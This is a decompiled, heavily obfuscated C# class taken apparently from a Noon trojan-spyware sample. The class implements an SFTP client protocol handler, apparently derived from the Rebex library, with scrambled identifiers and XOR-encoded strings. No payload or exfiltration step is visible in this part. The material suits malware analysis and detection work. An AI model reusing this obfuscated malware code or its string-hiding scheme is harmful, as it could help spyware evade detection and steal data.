// Decompiled with JetBrains decompiler
// Type: @WqZ#:*.h3Rg#eT
// Assembly: ;8w1LFr, Version=5.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 2CC07ADF-5A94-44BC-9C37-07435DAD286F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Noon.pef-7dfe305f31c1f571790f54c3522eb8c6066453e69a429782ebfc0d6f68b2ae34.exe

using \u0024iWy\u003Bm\u005E;
using \u00251faOD\u0023;
using \u0025dxe\u002B\u005E\u0021;
using \u00295se8Ta;
using \u0029XX\u002FH9j;
using \u002A\u0023\u0025R\u0040\u00278;
using \u002A\u0027\u0029\u00406\u002BQ;
using \u002A\u005ET\u003AdQS;
using \u002AM\u0029\u003A\u0023VB;
using \u002AMeq\u0027\u007E\u0027;
using \u002AQ0TSD\u0023;
using \u002B42b\u002B_X;
using \u002Bfcp\u002F\u002Al;
using \u002BtqrL9p;
using \u002Ftulqoc;
using \u002Fyk\u002A0\u005EA;
using \u0030Ys\u002Atx6;
using \u0035HQTSy\u0023;
using \u0037GvLErq;
using \u0037li\u002D\u002BE\u005E;
using \u003B8w1LFr;
using \u0040WqZ\u0023\u003A\u002A;
using \u007E\u002B\u005EJ0Pi;
using A\u003B\u0029R7s\u002D;
using ae\u007E\u003BTgP;
using b\u00401QD\u002D\u002A;
using cr\u0040\u002A\u002BCx;
using cRsUvx1;
using f\u002D\u0027j\u003F9e;
using H24OMfR;
using i7EM\u003F6s;
using if\u0025\u0029O5e;
using kdF\u00242Bb;
using M\u00241\u0027Eye;
using qq\u003B8\u002BW3;
using QxjNL8G;
using r\u0024Yv\u0023\u0021D;
using Rebex;
using Rebex.Net;
using S\u00278F\u0024\u002Di;
using System;
using System.Collections;
using System.Globalization;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using US_\u002DA\u002BI;
using W\u002AD\u003B_u6;

namespace \u0040WqZ\u0023\u003A\u002A
{
  internal class h3Rg\u0023eT
  {
    private readonly NAwnAxL fRQAjAN;
    private int zR\u002A\u002F\u005E\u002BP = 60000;
    private Encoding \u002AUmhw\u002F\u002F;
    private int kv5mWxx;
    private bool B\u002BjLQpA;
    private SshChannel hY0\u002FAw\u002F;
    private ISocket \u00409LW9Ca;
    private const int \u002BVp5\u002Aw\u002F = 32768;
    private const int Ba\u003FH746 = 1048576;
    private byte[] \u007EF\u0029\u002Fm10 = new byte[32768];
    private int jLTbD\u003FU;
    private readonly L\u002AV\u002Blbk \u002B\u0027IQ5_7;
    private readonly object Bh\u002DI1\u0023E = new object();
    private readonly object wgb\u0040cvf = new object();
    private readonly Hashtable \u0039w\u002FklOK = new Hashtable();
    private uint \u005E\u002145\u0029aH;
    private PhGFVf\u0023 \u002Ahx\u0025fvY;

    public int \u002F\u002F\u00262lBu
    {
      [SpecialName] set => ((h3Rg\u0023eT) this).zR\u002A\u002F\u005E\u002BP = value;
    }

    public Encoding W\u002BH5rBE
    {
      set
      {
        if (this.B\u002BjLQpA)
          return;
        this.\u002AUmhw\u002F\u002F = value;
        this.\u002B\u0027IQ5_7.fMvbu\u002Ah = value;
      }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    private uint KqX\u002F\u007E\u0029e()
    {
      ++this.\u005E\u002145\u0029aH;
      if (this.\u005E\u002145\u0029aH == 0U)
        ++this.\u005E\u002145\u0029aH;
      return this.\u005E\u002145\u0029aH;
    }

    public h3Rg\u0023eT(
      NAwnAxL sftp,
      Encoding encoding,
      \u0040jG9\u002BFT brand,
      \u0032NjU\u003F\u0040O options)
    {
      switch (brand)
      {
        case \u0040jG9\u002BFT.WsFtp:
          this.B\u002BjLQpA = true;
          encoding = Encoding.UTF8;
          break;
        case \u0040jG9\u002BFT.JScape:
          encoding = Encoding.UTF8;
          break;
      }
      this.fRQAjAN = sftp;
      this.\u002AUmhw\u002F\u002F = encoding;
      this.\u002B\u0027IQ5_7 = (L\u002AV\u002Blbk) new tdueioy(encoding);
      this.kv5mWxx = (options & \u0032NjU\u003F\u0040O.DisableSftp4) == \u0032NjU\u003F\u0040O.None ? 4 : 3;
    }

    public iQtvVz\u002F LvO\u002DruE(SshChannel _param1, iQtvVz\u002F _param2)
    {
      this.hY0\u002FAw\u002F = _param1;
      return this.\u00309L1\u002F\u002DJ(_param2);
    }

    public iQtvVz\u002F x\u0027\u003Be7J\u007E(ISocket _param1)
    {
      this.\u00409LW9Ca = _param1;
      return this.\u00309L1\u002F\u002DJ(iQtvVz\u002F.Unknown);
    }

    private iQtvVz\u002F \u00309L1\u002F\u002DJ(iQtvVz\u002F _param1)
    {
      ESwVv9k eswVv9k = new ESwVv9k(this.kv5mWxx);
      this.\u0024l\u002B\u002AH\u003A\u002B((\u0023n_xoXb) eswVv9k);
      \u0023n_xoXb nXoXb;
      int num = (int) this.\u0035_LkrK5(out nXoXb);
      this.fRQAjAN.qv\u003Ao9uD(eswVv9k.GetType(), nXoXb);
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, typeof (PhGFVf\u0023));
      this.\u002Ahx\u0025fvY = (PhGFVf\u0023) nXoXb;
      if (((ESwVv9k) this.\u002Ahx\u0025fvY).get_Version() > 3)
      {
        this.\u002AUmhw\u002F\u002F = Encoding.UTF8;
        this.\u002B\u0027IQ5_7.fMvbu\u002Ah = Encoding.UTF8;
      }
      string str1 = sgxPeiI.LiHKl\u0027x("", "WAP7kr4oRqHlPkgM3fwOJ");
      string str2 = this.\u002Ahx\u0025fvY.A1\u0040kHVY(sgxPeiI.LiHKl\u0027x("\u0011\f\u000Fs*4y", "WAP7kr4oRqHlPkgM3fwOJ"));
      iQtvVz\u002F iQtvVz;
      if (!(str2 == sgxPeiI.LiHKl\u0027x("rc", "WAP7kr4oRqHlPkgM3fwOJ")))
      {
        if (!(str2 == sgxPeiI.LiHKl\u0027x("u", "WAP7kr4oRqHlPkgM3fwOJ")))
        {
          if (str2 == null)
          {
            iQtvVz = _param1;
          }
          else
          {
            iQtvVz = iQtvVz\u002F.Unknown;
            str1 = sgxPeiI.LiHKl\u0027x("_\u0006\u0016?\"4<2\u00142\u000E+\u000F-o\u0015w/+\u0001\r\r\u0004", "WAP7kr4oRqHlPkgM3fwOJ");
          }
        }
        else
          iQtvVz = iQtvVz\u002F.Unix;
      }
      else
        iQtvVz = iQtvVz\u002F.Windows;
      switch (iQtvVz)
      {
        case iQtvVz\u002F.Windows:
          str1 = sgxPeiI.LiHKl\u0027x("_\u0006\u0016?\"zK.\u0014=\u000F3\vn#\fp+\u007F\u0017\u000E\u001E\u001D\u001Ep17", "WAP7kr4oRqHlPkgM3fwOJ");
          break;
        case iQtvVz\u002F.Unix:
          str1 = sgxPeiI.LiHKl\u0027x("_\u0006\u0016?\"zI)\u0013!M(\u0011(*Ek\">\u0013\u0004\u0010\u001B\u0015", "WAP7kr4oRqHlPkgM3fwOJ");
          break;
      }
      this.fRQAjAN.QuNuI5r((LogLevel) 30, \u0034\u003Fx\u00250\u0021v.Info, sgxPeiI.LiHKl\u0027x("*\u001A\u0011q$zO\u0001.\t@2\u0003s2\u001E*3q", "WAP7kr4oRqHlPkgM3fwOJ"), (object) ((ESwVv9k) this.\u002Ahx\u0025fvY).get_Version(), (object) str1);
      return iQtvVz;
    }

    public q\u003Axmpjp \u005EZ9Z\u0023q3(
      string kAw2Utq,
      roqVRkk _param2,
      bool _param3)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      \u0023n_xoXb nXoXb = this.Y_UG\u007EaE((\u0023n_xoXb) new Of\u0026\u0027KTs(requestId, kAw2Utq, _param2, ((ESwVv9k) this.\u002Ahx\u0025fvY).get_Version()), requestId);
      if (nXoXb is \u003BRhJK\u003Ah rhJkH && rhJkH.r\u0029X\u002B5Vk == 2U && !_param3)
        return (q\u003Axmpjp) null;
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, typeof (KHWEDrP));
      return new q\u003Axmpjp(((KHWEDrP) nXoXb).\u003BcUJh0N);
    }

    public q\u003Axmpjp \u0027mzsgZM(
      string _param1,
      bool _param2,
      out \u003BRhJK\u003Ah _param3)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      \u0023n_xoXb nXoXb = this.Y_UG\u007EaE((\u0023n_xoXb) new \u002B\u0025bDC3c(requestId, _param1), requestId);
      _param3 = nXoXb as \u003BRhJK\u003Ah;
      if (_param3 != null && !_param2)
        return (q\u003Axmpjp) null;
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, typeof (KHWEDrP));
      return new q\u003Axmpjp(((KHWEDrP) nXoXb).\u003BcUJh0N);
    }

    public void _z\u0021\u002F\u0025\u0040S(q\u003Axmpjp _param1, bool _param2)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      t29\u002A0Jg t290Jg = new t29\u002A0Jg(requestId, ((NAwnAxL) _param1).get_Value());
      \u0023n_xoXb nXoXb;
      try
      {
        nXoXb = this.Y_UG\u007EaE((\u0023n_xoXb) t290Jg, requestId);
      }
      catch
      {
        if (_param2)
          return;
        throw;
      }
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, (Type) null);
    }

    public byte[] bF\u0021kK5d(q\u003Axmpjp _param1, long _param2, int _param3)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      \u0023n_xoXb nXoXb = this.Y_UG\u007EaE((\u0023n_xoXb) new rEcH1e\u0025(requestId, ((NAwnAxL) _param1).get_Value(), _param2, _param3), requestId);
      if (nXoXb is \u003BRhJK\u003Ah rhJkH && rhJkH.r\u0029X\u002B5Vk == 1U)
        return new byte[0];
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, typeof (o\u002ANRv\u0029I));
      return ((o\u002ANRv\u0029I) nXoXb).aNV\u0040E\u0021H;
    }

    public uint V\u0029VodZp(q\u003Axmpjp _param1, long _param2, int _param3)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      this.\u002FN\u003F\u007E\u0021B2((\u0023n_xoXb) new rEcH1e\u0025(requestId, ((NAwnAxL) _param1).get_Value(), _param2, _param3), requestId);
      return requestId;
    }

    public byte[] mtUN\u007Eh5(uint _param1)
    {
      \u0023n_xoXb nXoXb = this.M7C\u0029Sj4(_param1);
      this.fRQAjAN.qv\u003Ao9uD(typeof (rEcH1e\u0025), nXoXb);
      if (nXoXb is \u003BRhJK\u003Ah rhJkH && rhJkH.r\u0029X\u002B5Vk == 1U)
        return new byte[0];
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, typeof (o\u002ANRv\u0029I));
      return ((o\u002ANRv\u0029I) nXoXb).aNV\u0040E\u0021H;
    }

    public void u\u0029g\u00259Iu(
      q\u003Axmpjp _param1,
      long _param2,
      byte[] _param3,
      int _param4,
      int _param5)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      h3Rg\u0023eT.\u002BiIb\u002BC4(this.Y_UG\u007EaE((\u0023n_xoXb) new Z\u003B\u0027EzR0(requestId, ((NAwnAxL) _param1).get_Value(), _param2, _param3, _param4, _param5), requestId), (Type) null);
    }

    public uint xq\u005EGmMx(
      q\u003Axmpjp _param1,
      long _param2,
      byte[] _param3,
      int _param4,
      int _param5)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      this.\u002FN\u003F\u007E\u0021B2((\u0023n_xoXb) new Z\u003B\u0027EzR0(requestId, ((NAwnAxL) _param1).get_Value(), _param2, _param3, _param4, _param5), requestId);
      return requestId;
    }

    public void \u003B\u002BYhdIt(uint _param1)
    {
      \u0023n_xoXb nXoXb = this.M7C\u0029Sj4(_param1);
      this.fRQAjAN.qv\u003Ao9uD(typeof (Z\u003B\u0027EzR0), nXoXb);
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, (Type) null);
    }

    public \u0024\u0027\u002DClxU \u0032m\u0029ydF6(
      q\u003Axmpjp _param1,
      \u003AZnnTCY _param2)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      \u0023n_xoXb nXoXb = this.Y_UG\u007EaE((\u0023n_xoXb) new f5\u003A2vj4(requestId, ((NAwnAxL) _param1).get_Value(), _param2, ((ESwVv9k) this.\u002Ahx\u0025fvY).get_Version()), requestId);
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, typeof (b02kH\u00257));
      return new \u0024\u0027\u002DClxU((string) null, ((b02kH\u00257) nXoXb).\u007E\u0024\u0024hQPY);
    }

    public \u0024\u0027\u002DClxU \u0029w\u005Ed\u002BY\u002D(
      string _param1,
      bool qVE1lbA,
      bool ngBDITB,
      bool _param4,
      iQtvVz\u002F _param5,
      \u003AZnnTCY _param6,
      out \u003BRhJK\u003Ah _param7)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      \u0023n_xoXb nXoXb = this.Y_UG\u007EaE((\u0023n_xoXb) new \u0021Jp23Tp(requestId, _param1, qVE1lbA, _param6, ((ESwVv9k) this.\u002Ahx\u0025fvY).get_Version()), requestId);
      _param7 = nXoXb as \u003BRhJK\u003Ah;
      if (_param7 != null)
      {
        if (_param7.r\u0029X\u002B5Vk == 2U && !ngBDITB)
          return (\u0024\u0027\u002DClxU) null;
        if (_param7.r\u0029X\u002B5Vk == 3U && !_param4)
          return (\u0024\u0027\u002DClxU) null;
      }
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, typeof (b02kH\u00257));
      b02kH\u00257 b02kH7 = (b02kH\u00257) nXoXb;
      int num = _param5 != iQtvVz\u002F.Windows ? _param1.LastIndexOf('/') : _param1.LastIndexOfAny(\u0025P\u003F1hnB.yz_\u003FH_p);
      return new \u0024\u0027\u002DClxU(num <= 0 ? _param1 : _param1.Substring(num + 1), b02kH7.\u007E\u0024\u0024hQPY);
    }

    public void J2sh\u0029K_(string _param1, \u0040Zx\u0026C_\u005E _param2)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      h3Rg\u0023eT.\u002BiIb\u002BC4(this.Y_UG\u007EaE((\u0023n_xoXb) new \u0025y\u003F\u003F_3\u005E(requestId, _param1, _param2, ((ESwVv9k) this.\u002Ahx\u0025fvY).get_Version()), requestId), (Type) null);
    }

    public \u0024\u0027\u002DClxU[] \u0039XWe\u002B\u005E5(
      q\u003Axmpjp _param1)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      \u0023n_xoXb nXoXb = this.Y_UG\u007EaE((\u0023n_xoXb) new QOERx3\u002B(requestId, ((NAwnAxL) _param1).get_Value()), requestId);
      if (nXoXb is \u003BRhJK\u003Ah rhJkH && rhJkH.r\u0029X\u002B5Vk == 1U)
        return (\u0024\u0027\u002DClxU[]) null;
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, typeof (\u007EjH\u007EAV9));
      return ((\u007EjH\u007EAV9) nXoXb).\u002DunRIx\u002F;
    }

    public void vO2\u003BD\u002De(string _param1)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      h3Rg\u0023eT.\u002BiIb\u002BC4(this.Y_UG\u007EaE((\u0023n_xoXb) new \u0024\u0023b\u00406b\u003A(requestId, _param1), requestId), (Type) null);
    }

    public void \u0036ubf8p0(string _param1)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      h3Rg\u0023eT.\u002BiIb\u002BC4(this.Y_UG\u007EaE((\u0023n_xoXb) new \u007EW\u0024\u002B\u00258c(requestId, _param1, ((ESwVv9k) this.\u002Ahx\u0025fvY).get_Version()), requestId), (Type) null);
    }

    public void \u0034z3m5Zn(string _param1)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      h3Rg\u0023eT.\u002BiIb\u002BC4(this.Y_UG\u007EaE((\u0023n_xoXb) new Yvs\u002DY\u002Ax(requestId, _param1), requestId), (Type) null);
    }

    public void DtJ8VQ\u002F(string _param1, string _param2)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      h3Rg\u0023eT.\u002BiIb\u002BC4(this.Y_UG\u007EaE((\u0023n_xoXb) new \u0021MA\u0023_S\u002A(requestId, _param1, _param2), requestId), (Type) null);
    }

    public string gem\u0027gFO(string _param1)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      \u0023n_xoXb nXoXb = this.Y_UG\u007EaE((\u0023n_xoXb) new ZN6u\u002Fa\u003F(requestId, _param1), requestId);
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, typeof (\u007EjH\u007EAV9));
      \u0024\u0027\u002DClxU[] unRix = ((\u007EjH\u007EAV9) nXoXb).\u002DunRIx\u002F;
      return unRix.Length == 1 ? unRix[0].jpN8\u0029xz : throw new ZrwFpFW(sgxPeiI.LiHKl\u0027x(">I\u0016~.?<5\u001F)\f=X4&\u0011sn>G\u0011\u0016\a\u001Fs&zu3\u001F4@3\u00190o\0c>:\u0004\u0016\u001A\rV", "WAP7kr4oRqHlPkgM3fwOJ"), B\u003FXMot\u002D.ServerProtocolViolation);
    }

    public string Xk_KT\u002FD(string _param1)
    {
      uint requestId = this.KqX\u002F\u007E\u0029e();
      \u0023n_xoXb nXoXb = this.Y_UG\u007EaE((\u0023n_xoXb) new \u0040\u002A\u00219NG\u003A(requestId, _param1), requestId);
      if (nXoXb is \u003BRhJK\u003Ah rhJkH && rhJkH.r\u0029X\u002B5Vk == 2U)
        return (string) null;
      h3Rg\u0023eT.\u002BiIb\u002BC4(nXoXb, typeof (\u007EjH\u007EAV9));
      \u0024\u0027\u002DClxU[] unRix = ((\u007EjH\u007EAV9) nXoXb).\u002DunRIx\u002F;
      return unRix.Length == 1 ? unRix[0].jpN8\u0029xz : throw new ZrwFpFW(sgxPeiI.LiHKl\u0027x(">I\u0016~.?<5\u001F)\f=X4&\u0011sn>G\u0011\u0016\a\u001Fs&zu3\u001F4@3\u00190o\0c>:\u0004\u0016\u001A\rV", "WAP7kr4oRqHlPkgM3fwOJ"), B\u003FXMot\u002D.ServerProtocolViolation);
    }

    private static void \u002BiIb\u002BC4(\u0023n_xoXb _param0, Type _param1)
    {
      if (_param0.GetType() == _param1)
        return;
      if (!(_param0 is \u003BRhJK\u003Ah status))
        throw new ZrwFpFW(string.Format((IFormatProvider) CultureInfo.InvariantCulture, sgxPeiI.LiHKl\u0027x("*\a\u001Dg3?\u007F3\u001F=@6\u001D3#\u001C;5o\u001AB\b\b\v?1?\u007F\"\u0013/\u0005 V", "WAP7kr4oRqHlPkgM3fwOJ"), new object[1]
        {
          (object) _param0.GetType().Name
        }), B\u003FXMot\u002D.ServerProtocolViolation);
      if (status.r\u0029X\u002B5Vk != 0U)
        throw new ZrwFpFW(status);
      if (!(_param1 == (Type) null))
        throw new ZrwFpFW(string.Format((IFormatProvider) CultureInfo.InvariantCulture, sgxPeiI.LiHKl\u0027x("*\a\u001Dg3?\u007F3\u001F=@6\u001D3#\u001C;5o\u001AB\b\b\v?1?\u007F\"\u0013/\u0005 V", "WAP7kr4oRqHlPkgM3fwOJ"), new object[1]
        {
          (object) _param0.GetType().Name
        }), B\u003FXMot\u002D.ServerProtocolViolation);
    }

    private void \u0024l\u002B\u002AH\u003A\u002B(\u0023n_xoXb _param1)
    {
      lock (this.Bh\u002DI1\u0023E)
      {
        this.\u002B\u0027IQ5_7.SetLength(0L);
        this.\u002B\u0027IQ5_7.WriteByte((byte) 0);
        this.\u002B\u0027IQ5_7.WriteByte((byte) 0);
        this.\u002B\u0027IQ5_7.WriteByte((byte) 0);
        this.\u002B\u0027IQ5_7.WriteByte((byte) 0);
        _param1.Pyz\u003B2\u002FS(this.\u002B\u0027IQ5_7);
        byte[] buffer = this.\u002B\u0027IQ5_7.GetBuffer();
        int num = (int) (this.\u002B\u0027IQ5_7.Length - 4L);
        buffer[0] = (byte) (num >> 24 & (int) byte.MaxValue);
        buffer[1] = (byte) (num >> 16 & (int) byte.MaxValue);
        buffer[2] = (byte) (num >> 8 & (int) byte.MaxValue);
        buffer[3] = (byte) (num & (int) byte.MaxValue);
        if (this.hY0\u002FAw\u002F != null)
          this.hY0\u002FAw\u002F.Send(buffer, 0, num + 4);
        else
          this.\u00409LW9Ca.Send(buffer, 0, num + 4, SocketFlags.None);
        this.\u002B\u0027IQ5_7.SetLength(0L);
      }
      this.fRQAjAN.l5oPw\u0024n(_param1);
    }

    private void \u002FN\u003F\u007E\u0021B2(\u0023n_xoXb _param1, uint _param2)
    {
      lock (this.\u0039w\u002FklOK.SyncRoot)
        this.\u0039w\u002FklOK.Add((object) _param2, (object) _param2);
      try
      {
        this.\u0024l\u002B\u002AH\u003A\u002B(_param1);
      }
      catch
      {
        lock (this.\u0039w\u002FklOK.SyncRoot)
        {
          this.\u0039w\u002FklOK.Remove((object) _param2);
          throw;
        }
      }
    }

    private \u0023n_xoXb Y_UG\u007EaE(\u0023n_xoXb _param1, uint _param2)
    {
      this.\u002FN\u003F\u007E\u0021B2(_param1, _param2);
      \u0023n_xoXb nXoXb = this.M7C\u0029Sj4(_param2);
      this.fRQAjAN.qv\u003Ao9uD(_param1.GetType(), nXoXb);
      return nXoXb;
    }

    private \u0023n_xoXb M7C\u0029Sj4(uint _param1)
    {
      int tickCount = Environment.TickCount;
      do
      {
        lock (this.wgb\u0040cvf)
        {
          lock (this.\u0039w\u002FklOK.SyncRoot)
          {
            if (this.\u0039w\u002FklOK[(object) _param1] is \u0023n_xoXb nXoXb)
            {
              this.\u0039w\u002FklOK.Remove((object) _param1);
              return nXoXb;
            }
          }
          uint key = this.\u0035_LkrK5(out nXoXb);
          lock (this.\u0039w\u002FklOK.SyncRoot)
          {
            if ((int) key == (int) _param1)
            {
              this.\u0039w\u002FklOK.Remove((object) _param1);
              return nXoXb;
            }
            if (!(this.\u0039w\u002FklOK[(object) key] is uint))
              throw new ZrwFpFW(sgxPeiI.LiHKl\u0027x("-\f\bs:zz(\by\u0001*X6!\u000Eu!(\tB\r\f\tj&)hg\r8\u0013d\n&,\0r8:\u0003L", "WAP7kr4oRqHlPkgM3fwOJ"), B\u003FXMot\u002D.ServerProtocolViolation);
            this.\u0039w\u002FklOK[(object) key] = (object) nXoXb;
          }
        }
      }
      while (Environment.TickCount - tickCount <= this.zR\u002A\u002F\u005E\u002BP);
      throw new ZrwFpFW(sgxPeiI.LiHKl\u0027x("+\0\u0015z,/hg\u001F!\u0003!\u001D'*\u00015", "WAP7kr4oRqHlPkgM3fwOJ"), B\u003FXMot\u002D.ServerProtocolViolation);
    }

    private void \u002An\u003A2B\u002Ad(int _param1)
    {
      if (_param1 > this.\u007EF\u0029\u002Fm10.Length)
      {
        int length = this.\u007EF\u0029\u002Fm10.Length;
        while (length < _param1)
          length *= 2;
        byte[] destinationArray = new byte[length];
        Array.Copy((Array) this.\u007EF\u0029\u002Fm10, 0, (Array) destinationArray, 0, this.jLTbD\u003FU);
        this.\u007EF\u0029\u002Fm10 = destinationArray;
      }
      while (this.jLTbD\u003FU < _param1)
        this.jLTbD\u003FU += this.hY0\u002FAw\u002F == null ? this.\u00409LW9Ca.Receive(this.\u007EF\u0029\u002Fm10, this.jLTbD\u003FU, this.\u007EF\u0029\u002Fm10.Length - this.jLTbD\u003FU, SocketFlags.None) : this.hY0\u002FAw\u002F.Receive(this.\u007EF\u0029\u002Fm10, this.jLTbD\u003FU, this.\u007EF\u0029\u002Fm10.Length - this.jLTbD\u003FU);
    }

    public static uint \u00369BIg\u003Bf(byte[] _param0, int _param1) => (uint) (((int) _param0[_param1] << 24) + ((int) _param0[_param1 + 1] << 16) + ((int) _param0[_param1 + 2] << 8)) + (uint) _param0[_param1 + 3];

    private uint \u0035_LkrK5(out \u0023n_xoXb _param1)
    {
      this.\u002An\u003A2B\u002Ad(4);
      uint num1 = h3Rg\u0023eT.\u00369BIg\u003Bf(this.\u007EF\u0029\u002Fm10, 0);
      if (num1 < 5U)
        throw new ZrwFpFW(string.Format(sgxPeiI.LiHKl\u0027x("2\f\vl\"=yg\r0\u0014,X*!\u0013z\"6\u0003B\u0013\f\u0016x72<<J$@3\u00190o\u0017~-:\u000E\u0014\u001A\rV", "WAP7kr4oRqHlPkgM3fwOJ"), (object) num1), B\u003FXMot\u002D.ServerProtocolViolation);
      int sourceIndex = (int) num1 + 4;
      if (sourceIndex > 1048576)
        throw new ZrwFpFW(string.Format(sgxPeiI.LiHKl\u0027x("2\f\vl\"=yg\r0\u0014,X*!\u0013z\"6\u0003B\u0013\f\u0016x72<<J$@3\u00190o\u0017~-:\u000E\u0014\u001A\rV", "WAP7kr4oRqHlPkgM3fwOJ"), (object) num1), B\u003FXMot\u002D.ServerProtocolViolation);
      this.\u002An\u003A2B\u002Ad(sourceIndex);
      byte num2 = this.\u007EF\u0029\u002Fm10[4];
      uint num3 = num2 == (byte) 2 ? 0U : h3Rg\u0023eT.\u00369BIg\u003Bf(this.\u007EF\u0029\u002Fm10, 5);
      try
      {
        switch (num2)
        {
          case 2:
            _param1 = (\u0023n_xoXb) new PhGFVf\u0023(this.\u007EF\u0029\u002Fm10, 4, sourceIndex - 4, this.\u002AUmhw\u002F\u002F);
            break;
          case 101:
            _param1 = (\u0023n_xoXb) new \u003BRhJK\u003Ah(this.\u007EF\u0029\u002Fm10, 4, sourceIndex - 4, this.\u002AUmhw\u002F\u002F);
            break;
          case 102:
            _param1 = (\u0023n_xoXb) new KHWEDrP(this.\u007EF\u0029\u002Fm10, 4, sourceIndex - 4, this.\u002AUmhw\u002F\u002F);
            break;
          case 103:
            _param1 = (\u0023n_xoXb) new o\u002ANRv\u0029I(this.\u007EF\u0029\u002Fm10, 4, sourceIndex - 4, this.\u002AUmhw\u002F\u002F);
            break;
          case 104:
            _param1 = (\u0023n_xoXb) new \u007EjH\u007EAV9(this.\u007EF\u0029\u002Fm10, 4, sourceIndex - 4, this.\u002AUmhw\u002F\u002F, ((ESwVv9k) this.\u002Ahx\u0025fvY).get_Version(), this.B\u002BjLQpA);
            break;
          case 105:
            _param1 = (\u0023n_xoXb) new b02kH\u00257(this.\u007EF\u0029\u002Fm10, 4, sourceIndex - 4, this.\u002AUmhw\u002F\u002F, ((ESwVv9k) this.\u002Ahx\u0025fvY).get_Version());
            break;
          default:
            throw new ZrwFpFW(string.Format((IFormatProvider) CultureInfo.InvariantCulture, sgxPeiI.LiHKl\u0027x("*\a\vj3*s5\u000E<\u0004d\n&?\tbn$W\u001F_\u001E\u0019lc(y$\u001F0\u0016!\u001Cm", "WAP7kr4oRqHlPkgM3fwOJ"), new object[1]
            {
              (object) num2
            }), B\u003FXMot\u002D.ServerProtocolViolation);
        }
      }
      finally
      {
        this.jLTbD\u003FU -= sourceIndex;
        Array.Copy((Array) this.\u007EF\u0029\u002Fm10, sourceIndex, (Array) this.\u007EF\u0029\u002Fm10, 0, this.jLTbD\u003FU);
      }
      return num3;
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern h3Rg\u0023eT(object @object, IntPtr method);
  }
}
